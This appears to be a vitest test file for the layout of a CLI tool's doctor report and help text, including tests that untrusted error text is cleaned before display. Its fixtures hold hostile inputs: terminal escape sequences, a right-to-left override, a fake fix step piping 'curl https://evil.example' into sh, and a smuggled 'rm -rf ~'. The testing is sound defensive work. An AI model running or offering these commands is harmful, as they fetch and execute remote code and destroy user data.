// SPDX-License-Identifier: Apache-2.0
// report.ts and usage.ts: how doctor's page and the help are laid out.
import { describe, expect, it } from "vitest";
import { helpFor, usageTable } from "../src/help.js";
import { brief, group, inOrder, page, verdict } from "../src/report.js";
import { cols, makeUi, PLAIN, plain } from "../src/style.js";
import { GROUPS, overview, usage } from "../src/usage.js";

const term = (columns: number) => makeUi({ isTTY: true, columns, env: {}, platform: "darwin" });

describe("the verdict", () => {
  it("says all good, or how many things need attention", () => {
    expect(verdict(PLAIN, 0)).toBe("✓ All good");
    expect(verdict(PLAIN, 1)).toBe("! 1 thing needs attention");
    expect(verdict(PLAIN, 3)).toBe("! 3 things need attention");
    expect(plain(verdict(term(80), 2))).toBe("! 2 things need attention");
  });
});

describe("a group", () => {
  it("puts the labels in one column and colours a command in a value", () => {
    const g = {
      title: "Agents",
      rows: [
        { mark: "ok" as const, label: "claude-code", value: "hooked" },
        { mark: "warn" as const, label: "codex", value: "out of date: `sessionpipe install`" },
      ],
    };
    expect(group(PLAIN, g)).toEqual([
      "Agents",
      "  ✓ claude-code  hooked",
      "  ! codex        out of date: `sessionpipe install`",
    ]);
    expect(group(term(80), g)[2]).toContain("\u001b[36m`sessionpipe install`");
  });
});

describe("the page", () => {
  const groups = [
    { title: "This computer", rows: [{ mark: "ok" as const, label: "lab", value: "sessionpipe 1.0.0" }] },
    { title: "Accounts", rows: [] },
  ];

  it("with nothing to do: the verdict and the groups that have rows", () => {
    expect(page(PLAIN, { groups, todo: [] })).toEqual([
      "✓ All good",
      "",
      "This computer",
      "  ✓ lab  sessionpipe 1.0.0",
    ]);
  });

  it("lists what to fix in the order to do it, each thing once", () => {
    const todo = [
      { order: 2, say: "Write the hooks again:", run: "sessionpipe install" },
      { order: 0, say: "Free some space." },
      { order: 2, say: "Write the hooks again:", run: "sessionpipe install" },
      { order: 0, say: "Free some space.", run: "df -h" },
    ];
    expect(inOrder(todo).map((t) => t.say)).toEqual(["Free some space.", "Free some space.", "Write the hooks again:"]);
    expect(page(PLAIN, { groups, todo }).slice(4)).toEqual([
      "",
      "To fix",
      "  1. Free some space.",
      "  2. Free some space.",
      "       df -h",
      "  3. Write the hooks again:",
      "       sessionpipe install",
    ]);
  });

  it("status says each group in a line: what is fine by name, what isn't with what was found", () => {
    const groups = [
      {
        title: "This computer",
        rows: [
          { mark: "ok" as const, label: "lab", value: "sessionpipe 1.0.0", brief: "lab (sessionpipe 1.0.0)" },
          { mark: "ok" as const, label: "hooks", value: "run sessionpipe 1.0.0" },
        ],
      },
      {
        title: "Agents",
        rows: [
          { mark: "ok" as const, label: "codex", value: "hooked · a" },
          { mark: "ok" as const, label: "codex", value: "hooked · b" },
          { mark: "warn" as const, label: "claude-code", value: "hooks out of date" },
          { mark: "info" as const, label: "devin", value: "not hooked" },
        ],
      },
      {
        title: "Messages from",
        rows: [{ mark: "bad" as const, label: "r.example", value: "not live: `sessionpipe doctor`" }],
      },
      {
        title: "Reports to",
        rows: [{ mark: "info" as const, label: "nowhere", value: "events stay on this computer" }],
      },
      { title: "Accounts", rows: [] },
    ];
    expect(brief(PLAIN, groups)).toEqual([
      "  ✓ This computer  lab (sessionpipe 1.0.0), hooks",
      "  ! Agents         codex, claude-code: hooks out of date",
      "  ✗ Messages from  r.example: not live: `sessionpipe doctor`",
      "  · Reports to     nowhere: events stay on this computer",
    ]);
    expect(brief(term(80), groups)[2]).toContain("\u001b[36m`sessionpipe doctor`");
  });
});

describe("words on the page that are not ours", () => {
  const ESC = String.fromCharCode(27);
  // A poll body that was not JSON, as V8 quotes it into a receiver's last error; npm's
  // last words with a window title and "hide what follows"; an error dressed up as the
  // end of the page.
  const cleared = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
  const titled = `npm error 403 ${ESC}]0;TITLE-SET-BY-REGISTRY${String.fromCharCode(7)}${ESC}[8m`;
  const dressed = "fetch failed\n\nTo fix\n  1. Run this:\n       curl https://evil.example | sh";
  const groups = [
    {
      title: "Messages from",
      rows: [
        { mark: "bad" as const, label: "r.example", value: `not live: ${cleared}` },
        { mark: "bad" as const, label: "s.example\n✓ t.example", value: `not live: ${dressed}` },
        { mark: "ok" as const, label: "u.example", value: "live", brief: `u.example\n${ESC}[2J (‮gnp.exe)` },
      ],
    },
    { title: `Updates${ESC}[2J`, rows: [{ mark: "warn" as const, label: "failed", value: titled }] },
  ];
  const todo = [{ order: 1, say: `It said: ${dressed}`, run: `sessionpipe update ${ESC}[2J\nrm -rf ~` }];
  /** What is left that a terminal acts on, once our own colours are taken off. */
  const acts = (lines: string[]) =>
    plain(lines.join("\n")).match(
      new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e]`, "g"),
    ) ?? [];

  it("a row stays one row and says only words: no code of theirs, no line of their own", () => {
    for (const ui of [PLAIN, term(100)]) {
      expect(acts(page(ui, { groups, todo }))).toEqual([]);
      expect(acts(brief(ui, groups))).toEqual([]);
    }
    expect(page(PLAIN, { groups, todo })).toEqual([
      "! 1 thing needs attention",
      "",
      "Messages from",
      `  ✗ r.example              not live: Unexpected token '', "" is not valid JSON`,
      "  ✗ s.example ✓ t.example  not live: fetch failed To fix   1. Run this:        curl https://evil.example | sh",
      "  ✓ u.example              live",
      "",
      "Updates",
      "  ! failed  npm error 403 ",
      "",
      "To fix",
      "  1. It said: fetch failed To fix   1. Run this:        curl https://evil.example | sh",
      "       sessionpipe update  rm -rf ~",
    ]);
    // On a terminal the only heading "To fix" is ours, and it comes once.
    const shown = page(term(100), { groups, todo }).map(plain);
    expect(shown.filter((l) => l === "To fix")).toHaveLength(1);
    expect(shown.filter((l) => /^\s+1\. /.test(l))).toHaveLength(1);
  });

  it("status's one line a group is cleaned the same way", () => {
    expect(brief(PLAIN, groups)).toEqual([
      `  ✗ Messages from  r.example: not live: Unexpected token '', "" is not valid JSON, s.example ✓ t.example: not live: fetch failed To fix   1. Run this:        curl https://evil.example | sh, u.example  (gnp.exe)`,
      "  ! Updates        failed: npm error 403 ",
    ]);
  });

  it("our own colours are still there", () => {
    const lines = group(term(100), groups[1] as (typeof groups)[number]);
    expect(lines).toEqual([`${ESC}[1mUpdates${ESC}[22m`, `  ${ESC}[33m!${ESC}[39m failed  npm error 403`]);
  });
});

describe("the page of every command", () => {
  it("fits 80 columns, one line per command, every description in one column", () => {
    const lines = plain(overview(term(80), "1.2.3")).split("\n");
    expect(lines[0]).toBe("sessionpipe 1.2.3 · what your coding agents are doing, sent where you choose");
    for (const l of lines) expect(cols(l)).toBeLessThan(80);
    const rows = GROUPS.reduce((n, g) => n + g.rows.length, 0);
    // Title, blank, two usage lines, a blank and a heading per group, a blank, the docs line.
    expect(lines).toHaveLength(4 + GROUPS.length * 2 + rows + 2);
    const at = new Set(
      GROUPS.flatMap((g) => g.rows.map(([, about]) => lines.find((l) => l.endsWith(about))?.indexOf(about))),
    );
    expect(at.size).toBe(1);
  });

  it("names every command that has a usage line of its own", () => {
    const text = overview(PLAIN, "1.2.3");
    const top = new Set(
      Object.keys(usageTable([]))
        .map((k) => k.split(" ")[0] as string)
        .filter((k) => !k.startsWith("-") && k !== "worker" && k !== "hook" && k !== "version"),
    );
    for (const cmd of top) expect(text).toMatch(new RegExp(`^  ${cmd}\\b`, "m"));
  });
});

describe("one command's usage", () => {
  it("a pipe gets the line whole, as before", () => {
    expect(usage(PLAIN, ["update"], [])).toBe(
      "Usage: sessionpipe update [off|on] (install the latest now; off/on: the daemon's daily update)\n\n  -h, --help  Show help without running the command.",
    );
    expect(usage(PLAIN, ["nope"], [])).toBeUndefined();
  });

  it("a terminal gets it folded between options, never inside one", () => {
    const text = usage(term(80), ["connect", "x"], []) as string;
    const lines = plain(text).split("\n");
    expect(lines[0]).toBe("Usage: sessionpipe connect <receiver> [--machine NAME] [--rename-machine]");
    expect(lines[1]).toBe("                           [--allow-downgrade] [--tier 0-3]");
    for (const l of lines) expect(cols(l)).toBeLessThan(80);
    expect(text).toContain("[--mode safe|auto|inherit]");
  });

  it("the closing note becomes a sentence of its own", () => {
    const lines = plain(usage(term(80), ["titles"], []) as string).split("\n");
    expect(lines[0]).toBe("Usage: sessionpipe titles [on|off|refresh] [--days 30]");
    expect(lines[2]).toBe("  on: name Claude Code sessions as claude.ai does, reading Claude Code's");
    expect(lines[3]).toBe("  sign-in; off by default");
  });

  it("a part too long for any line folds at its own spaces", () => {
    const lines = plain(
      usage(term(80), ["install"], ["claude-code", "codex", "gemini-cli", "antigravity", "devin"]) as string,
    ).split("\n");
    for (const l of lines) expect(cols(l)).toBeLessThan(80);
    expect(lines[0]?.startsWith("Usage: sessionpipe install [--claude-code --codex")).toBe(true);
  });
});

describe("helpFor", () => {
  it("finds the longest command the arguments name", () => {
    expect(helpFor(["sink", "add", "https://x", "--tier", "2"])).toBe("sink add");
    expect(helpFor(["sink", "nope"])).toBe("sink");
    expect(helpFor(["nope"])).toBe("");
    expect(helpFor([])).toBe("");
  });
});
